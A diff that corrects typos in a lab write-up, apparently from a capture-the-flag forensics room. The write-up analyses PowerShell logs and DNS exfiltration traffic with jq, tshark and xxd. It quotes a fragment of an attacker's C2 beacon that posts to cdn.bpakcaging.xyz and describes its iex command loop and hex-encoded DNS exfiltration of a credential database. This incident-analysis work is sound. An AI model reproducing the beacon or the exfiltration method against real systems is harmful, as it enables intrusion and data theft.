@@ -64,16 +64,16 @@ I also get the SHA-256 hash and check it in VirusTotal to see whether the file h
 ## 🚪 Powershell log Analysis ! 
 
 
-The roo mgive us another artefact , a Powershell logs ! In this case i will use JQ cheatsheet to investigate through the powershell log.
+The room give us another artefact , a Powershell logs ! In this case i will use JQ cheatsheet to investigate through the powershell log.
 
 <img width="700"  alt="Capture d&#39;écran 2026-07-02 150450" src="https://github.com/user-attachments/assets/478ab287-2207-47ea-93aa-435f533cf497" />
 
 
-I need to choose the right command to understand what the attacker type in the powershell environment 
+I need to choose the right command to understand what the attacker typed in the powershell environment 
 `
 cat powershell.json | jq -r '.ScriptBlockText' | sort -u
 `
-Allow me to filter with the ScriptBlockText only .  The field who containt Powershell code execute. This revealed the full post-compromise kill chain.  Let's analysis all of that.
+Allow me to filter with the ScriptBlockText only .  The field that contains Powershell code execute. This revealed the full post-compromise kill chain.  Let's analyse all of that.
 
  
 ### 1. Initial stager
@@ -132,7 +132,7 @@ $s='cdn.bpakcaging.xyz:8080'; ... Invoke-WebRequest ... -Method POST ...
 An HTTP beaconing loop against **`cdn.bpakcaging.xyz:8080`**, fetching commands, executing them via `iex`, and POSTing the results back.
 
 
-So we know that the attacker want to exfiltrade data from the copagny to the C2 servers. My feeling now is so investigate the network log .
+So we know that the attacker wanted to exfiltrade data from the copagny to the C2 servers. My feeling now is to investigate the network log .
 
 <img width="700" alt="Capture d&#39;écran 2026-07-02 151847" src="https://github.com/user-attachments/assets/daeccf19-1820-479f-965c-be4203d5cc80" />
 
@@ -140,24 +140,24 @@ So we know that the attacker want to exfiltrade data from the copagny to the C2 
 
 ## Network Traffic Analysis ! 
 
-We know the attacker use DNS protocol to exfiltration, also the room give us another artefact a .pcap. So its time to use wireshark and tshark .
+We know the attacker uses DNS protocol to exfiltration, also the room give us another artefact a .pcap. So its time to use wireshark and tshark .
 
-First of all let's look at  the communication beetween us and files.bpakcaging.xyz the malicious domain.
+First of all let's look at  the communication between us and files.bpakcaging.xyz the malicious domain.
 
 <img width="700"  alt="Capture d&#39;écran 2026-07-02 153334" src="https://github.com/user-attachments/assets/6ae6ead3-a1d6-4dc3-8cf9-f40ac1a3aba1" />
 
 <img width="700"  alt="Capture d&#39;écran 2026-07-02 153347" src="https://github.com/user-attachments/assets/62784041-a357-4f14-b2f4-45d49021de1c" />
 
 We have the software used by the attacker to host its presumed file / payload server : Python the answer of the first queston ! With the Powershell command analysis we know the attacker use the binary 
-"sq3.exe" to access "plum.sqlite" who can include credentials 
+"sq3.exe" to access "plum.sqlite" which can include credentials 
 
-Lets filter with sq3.exe. The first packet is the start of the exfiltration attempt and we see the sql command used to retrieve the data frm the table "note" . I change stream to the next (750) to see what happens to the data exfiltration and let's decode the hex encoding. 
+Lets filter with sq3.exe. The first packet is the start of the exfiltration attempt and we see the sql command used to retrieve the data from the table "note" . I change stream to the next (750) to see what happens to the data exfiltration and let's decode the hex encoding. 
 
 
 <img width="700"  alt="Capture d&#39;écran 2026-07-02 154300" src="https://github.com/user-attachments/assets/5bbcdb40-019f-4708-b294-31b61d32d05b" /> <img width="700"  alt="image-1604-1024x473-1" src="https://github.com/user-attachments/assets/375d00db-3ab6-4ba2-b14d-4dd990764864" />
 
 We get the password to exfiltrated file. Now we have to find the database and open it with the password to know exactly what data was exfiltrated ! 
-The data is split beetween several packet , so that the time to use Tshark to analyze the DNS traffic and extract only the encoded data . 
+The data is split between several packets , so that the time to use Tshark to analyze the DNS traffic and extract only the encoded data . 
 
 
 ```powershell
@@ -165,7 +165,7 @@ tshark -r capture.pcapng  -Y 'dns' -T fields -e dns.qry.name |grep ".bpakcaging.
 ```
 This command filters the DNS packets, keeps only the queries containing the domain bpakcaging.xyz, and extracts the first subdomain field (cut -f1 -d '.') to isolate the exfiltrated hex data. The grep -v excludes the legitimate files and cdn subdomains (the file server and the C2), keeping only the exfiltration chunks.
 
-Now i can  save the result into a text file. Before opening it, i need to decode the hex strings either with  cyberchef (saving the  inputs as a .kdbx file) or with the the command
+Now i can  save the result into a text file. Before opening it, i need to decode the hex strings either with  cyberchef (saving the  inputs as a .kdbx file) or with  the command
 ```powershell
 xxd -r -p  credentials.txt > credentials.kdbx
 ```
